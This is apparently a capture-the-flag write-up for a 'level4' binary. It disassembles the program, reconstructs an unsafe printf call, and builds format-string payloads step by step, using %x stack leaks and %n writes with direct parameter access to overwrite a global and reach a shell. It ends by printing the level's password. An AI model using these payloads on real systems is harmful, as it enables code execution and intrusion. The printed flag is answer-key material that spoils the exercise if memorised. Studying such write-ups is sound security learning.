## level4
Here is the objdump for the level4 application
```
08048444 <p>:
 8048444:       55                      push   ebp
 8048445:       89 e5                   mov    ebp,esp
 8048447:       83 ec 18                sub    esp,0x18
 804844a:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 804844d:       89 04 24                mov    DWORD PTR [esp],eax
 8048450:       e8 eb fe ff ff          call   8048340 <printf@plt>
 8048455:       c9                      leave
 8048456:       c3                      ret

08048457 <n>:
 8048457:       55                      push   ebp
 8048458:       89 e5                   mov    ebp,esp
 804845a:       81 ec 18 02 00 00       sub    esp,0x218
 8048460:       a1 04 98 04 08          mov    eax,ds:0x8049804
 8048465:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 8048469:       c7 44 24 04 00 02 00    mov    DWORD PTR [esp+0x4],0x200
 8048470:       00
 8048471:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
 8048477:       89 04 24                mov    DWORD PTR [esp],eax
 804847a:       e8 d1 fe ff ff          call   8048350 <fgets@plt>
 804847f:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
 8048485:       89 04 24                mov    DWORD PTR [esp],eax
 8048488:       e8 b7 ff ff ff          call   8048444 <p>
 804848d:       a1 10 98 04 08          mov    eax,ds:0x8049810
 8048492:       3d 44 55 02 01          cmp    eax,0x1025544
 8048497:       75 0c                   jne    80484a5 <n+0x4e>
 8048499:       c7 04 24 90 85 04 08    mov    DWORD PTR [esp],0x8048590
 80484a0:       e8 bb fe ff ff          call   8048360 <system@plt>
 80484a5:       c9                      leave
 80484a6:       c3                      ret

080484a7 <main>:
 80484a7:       55                      push   ebp
 80484a8:       89 e5                   mov    ebp,esp
 80484aa:       83 e4 f0                and    esp,0xfffffff0
 80484ad:       e8 a5 ff ff ff          call   8048457 <n>
 80484b2:       c9                      leave
 80484b3:       c3                      ret
 80484b4:       90                      nop
 80484b5:       90                      nop
 80484b6:       90                      nop
 80484b7:       90                      nop
 80484b8:       90                      nop
 80484b9:       90                      nop
 80484ba:       90                      nop
 80484bb:       90                      nop
 80484bc:       90                      nop
 80484bd:       90                      nop
 80484be:       90                      nop
 80484bf:       90                      nop
```

From the objdump, I deduced that the source code looks something like this

```clike=
#include <stdio.h>
#include <stdlib.h>

static int    g_var = 0;

void p(char *buffer)
{    
    printf(buffer);
}

void n()
{
    // 804845a
    char buf[512]; // 0x200
    
    // 804847a
    fgets(buf, 512, stdin);
    
    // 804847a
    p(buf);
    
    if (g_var + 12 != 0x1025544)
        return;
    system("/bin/sh");
    
}
    
int main()
{
    n()
}
```

This is quite similar to level3, there is an unsafe printf and we are tasked to overwrite the data address `0x08049810` to value `0x01025544` or `16930116` in decimal. This value is too large for us to print out manually as fgets only reads up to 512 characters. We will need to fill in the values using several writes.  

According to this example from the book, we are able to write into contigious bytes like so.
![image](https://hackmd.io/_uploads/rJ8GmjFrT.png)

Because of the little endianess, we will first need to reverse the order of the value to `0x44550201`, then, we can map out the values we want to write to which addresses. 

```
0x08049810 - 0x44
0x08049811 - 0x55
0x08049812 - 0x02
0x08049813 - 0x01
```

And we also need to know how much do we need to traverse in the stack to reach those addresses to reach `0x08049810` , so I tested them out and I got 

```
BBBB b7ff26b0 bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825
```

This shows that i need to format %x 11 times to get to the values of the first argument. Now lets try writing to them in the actual address to verify the ordering. With the input as `python -c "print '\x08\x04\x98\x10'[::-1] + '\x08\x04\x98\x11'[::-1] + '%x ' * 11 + '%n %n'"> /tmp/level4`, we manage to observe the address being written as below, which proves the ordering correct.

![image](https://hackmd.io/_uploads/Skf1jitBT.png)

I believe all of this information is sufficient for us to actually write the values. However, we are not able to use %n for its intented purposes to count bytes, since the minimum characters to reach the address already exceeds `0x44`

Looking at this [blog](https://gbmaster.wordpress.com/2015/12/08/x86-exploitation-101-format-strings-ill-tell-ya-what-to-say/), it shows that printf has something called **direct paremeter access** which allows us to access certain parameters without needing to format them one by one beforehand. Its syntax looks like this - `%7$x` where it means **Access the 7th argument as a hex**. This can help cut down the bytes below the minimum. To apply this change, we can change out input like so ` python -c "print '\x08\x04\x98\x10'[::-1] + '\x08\x04\x98\x11'[::-1] + 'B' * 60 + '%12\$n' + 'B' * 16 + '%13\$n'"> /tmp/level4`

As we can see, we are able to nail the `44` and `55` requirement. However, we cant use the say way to do `02` and `01`, since the values printed by **%n can only increase**.
![image](https://hackmd.io/_uploads/BkRWW2YBp.png)

To circumvent this, we can **"wrap" the two values together** to one. Making out mapping change like so. 
```
0x08049810 - 0x44
0x08049811 - 0x55
0x08049812 - 0x102
```

Which changes the input to - 
`python -c "print '\x08\x04\x98\x10'[::-1] + '\x08\x04\x98\x11'[::-1] + '\x08\x04\x98\x12'[::-1] + 'B' * 56 + '%12\$n' + 'B' * 17 + '%13\$n' + 'B' * 173 + '%14\$n'"> /tmp/level4`

And there we have it, the final value of the global static.
![image](https://hackmd.io/_uploads/HJD-r2YrT.png)

The password was printed on execution.
`0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`